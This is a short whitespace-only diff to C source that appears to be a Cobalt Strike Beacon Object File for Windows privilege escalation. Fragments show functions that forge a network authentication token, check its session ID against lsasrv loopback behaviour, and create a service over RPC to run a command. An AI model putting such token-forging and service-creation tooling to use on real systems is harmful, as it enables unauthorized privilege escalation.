@@ -814,7 +814,7 @@ int InvokeCreateSvcRpcMain(char* pExecCmd)
         MSVCRT$free(RpcConnection);
         return 1;
     }
-    
+
     MSVCRT$free(RpcConnection);
 
     return 0;
@@ -830,7 +830,7 @@ HANDLE ForgeNetworkAuthToken();
 void CheckTokenSession(HANDLE hToken);
 BOOL IsThreadTokenIdentification();
 
-void go(char * args, unsigned long length) 
+void go(char * args, unsigned long length)
 {
     datap parser;
     char *fileToRun = NULL;
@@ -955,7 +955,7 @@ void CheckTokenSession(HANDLE hToken) {
         BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed with error code %d \n", KERNEL32$GetLastError());
         return;
     }
-    // This should be always true for Windows versions <= 10 Build 1809 
+    // This should be always true for Windows versions <= 10 Build 1809
     if (tokenSessionId == 0)
         BeaconPrintf(CALLBACK_OUTPUT,"Forged Token Session ID set to 0. Older Win version detected, lsasrv!LsapApplyLoopbackSessionId probably not present here...\n");
     else
